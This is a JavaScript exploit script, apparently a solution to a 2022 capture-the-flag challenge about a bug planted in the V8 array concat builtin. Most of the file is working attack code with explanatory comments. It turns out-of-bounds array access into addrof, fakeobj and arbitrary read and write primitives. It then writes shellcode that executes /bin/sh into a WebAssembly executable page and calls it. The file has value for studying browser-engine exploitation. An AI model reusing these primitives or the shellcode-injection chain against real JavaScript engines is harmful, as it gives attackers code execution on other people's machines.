//
// Solution to DUCTF 2022 'optimal vee ate' challenge.
//

var bytes = new ArrayBuffer(8);
var floats = new Float64Array(bytes);
var uints = new BigUint64Array(bytes);

function float_to_uint(val) {
  floats[0] = val;
  return uints[0];
}

function uint_to_float(val) {
  uints[0] = val;
  return floats[0];
}

// Instantiate several arrays so they get allocated one after the other on the
// heap. We want to access memory below our `oob_arr`.
var oob_arr = [1.1];
var f64_arr = [1.1];
var tmp_obj = {a: 1};
var obj_arr = [tmp_obj];

// Here's the actual exploit primitive.
//
// If we review the control flow of the code added to the array concat builtin
// we see that if we attempt to append an array of length 1 it will call a
// function called `AppendToFastJSArray`.
// ```
// if (arguments.length == 1) {
//   typeswitch (arguments[0]) {
//     case (right: FastJSArrayForCopy): {
//       if (right.length == SmiConstant(1)) {
//         return AppendToFastJSArray(context, left, right)
//             otherwise ConcatAppendFailure;
// ```
//
// Reviewing that function, we find that if the single value stored in the
// array provided as an argument is null or undefined, the implementation will
// naively attempt to append an undefined argument by simply increasing the
// length of the array by 1.
// ```
// if (!IsNullOrUndefined(value)) {
//   ...
// } else {
//   let leftW = NewFastJSArrayWitness(left);
//   leftW.ChangeLength(left.length + SmiConstant(1));
// }
//
// return left;
// ```
//
// Since this is a float array, this gives us OOB access 64-bits below our
// array. Repeating this many times will increase the length as much as we like.
for (let i = 0; i < 999; ++i) {
  oob_arr.concat([undefined]);
}
console.assert(oob_arr.length == 1000);

// Retrieve the maps for a float array and an object array. We'll need these
// for our `addrof` and `fakeobj` primitives.
var f64_map = float_to_uint(oob_arr[5]) & 0xffffffffn;
var obj_map = float_to_uint(oob_arr[14]) & 0xffffffffn;

// Our `addrof` primitive. Store an object at index 0 within `obj_arr`. Replace
// the object array's map with that of a float array's. Read from `obj_arr[0]`
// to get the address of the object (stored in the lower 32-bits). Restore the
// object array's original map.
function addrof(obj) {
  obj_arr[0] = obj;
  properties = float_to_uint(oob_arr[14]) >> 32n;
  oob_arr[14] = uint_to_float((properties << 32n) + f64_map);

  var ptr = float_to_uint(obj_arr[0]) & 0xffffffffn;
  oob_arr[14] = uint_to_float((properties << 32n) + obj_map);
  return ptr - 1n;
}

// Our `fakeobj` primtive. Store a pointer at `f64_arr[0]`. Replace the map of
// `f64_arr` with that of an object array. Retrieve the "object" stored at the
// first index of `f64_arr` to get a fake object at that address. Restore the
// float array's original map.
function fakeobj(ptr) {
  f64_arr[0] = uint_to_float(ptr + 1n);
  properties = float_to_uint(oob_arr[5]) >> 32n;
  oob_arr[5] = uint_to_float((properties << 32n) + obj_map);

  var obj = f64_arr[0];
  oob_arr[5] = uint_to_float((properties << 32n) + f64_map);
  return obj;
}

// Float array required for our arbitrary read and write primitives.
var rdw_arr = [1.1, 2.2];

// Our arbitrary read primitive. Stores the address of a float map in the first
// index of our `rdw_arr`. We then create a fake object at that address, before
// updating that fake object's elements pointer via a write to `rdw_arr[1]`
// (making sure to maintain the length of our fake array) to point to where we
// want to read. Reading the value stored at `obj[0]` we get an arbitrary 64-bit
// read.
function arb_read(ptr) {
  rdw_arr[0] = uint_to_float(f64_map);
  var obj = fakeobj(addrof(rdw_arr) + 0x20n);

  rdw_arr[1] = uint_to_float((1n << 33n) + ptr - 8n + 1n);
  return float_to_uint(obj[0]);
}

// Our arbitrary write primitive. Very similar to our arbitrary read primitive,
// only we write a value to `obj[0]` rather than read from it. This gives us
// an arbitrary 64-bit write.
function arb_write(ptr, val) {
  rdw_arr[0] = uint_to_float(f64_map);
  var obj = fakeobj(addrof(rdw_arr) + 0x20n);

  rdw_arr[1] = uint_to_float((1n << 33n) + ptr - 8n + 1n);
  obj[0] = uint_to_float(val);
}

// By instantiating an ArrayBuffer object, and replacing it's backing store with
// an address of our choosing (via our arbitrary write primitive), we can write
// a series of bytes of arbitrary length to a particular address.
function write_data(ptr, data) {
  var buf = new ArrayBuffer(data.length);
  var view = new DataView(buf);

  var store = addrof(buf) + 0x1cn;
  arb_write(store, ptr);

  for (let i = 0; i < data.length; ++i) {
    view.setUint8(i, data[i]);
  }
}

var wasm_code = new Uint8Array([
  0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,
  0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,
  0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,
  10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11
]);

var wasm_module = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_module);
var wasm_entry = wasm_instance.exports.main;

// Find the address of the rwx page created by wasm using our arbitrary read
// primitive.
var rwx_page = arb_read(addrof(wasm_instance) + 0x68n);

// msfvenom -p linux/x64/exec CMD="/bin/sh" -f csharp
var shellcode = new Uint8Array([
  0x48,0xb8,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x99,0x50,0x54,0x5f,0x52,
  0x66,0x68,0x2d,0x63,0x54,0x5e,0x52,0xe8,0x08,0x00,0x00,0x00,0x2f,0x62,0x69,
  0x6e,0x2f,0x73,0x68,0x00,0x56,0x57,0x54,0x5e,0x6a,0x3b,0x58,0x0f,0x05
]);

// Write our shellcode to the rwx page and call the wasm entrypoint to get
// code execution.
write_data(rwx_page, shellcode);
wasm_entry();

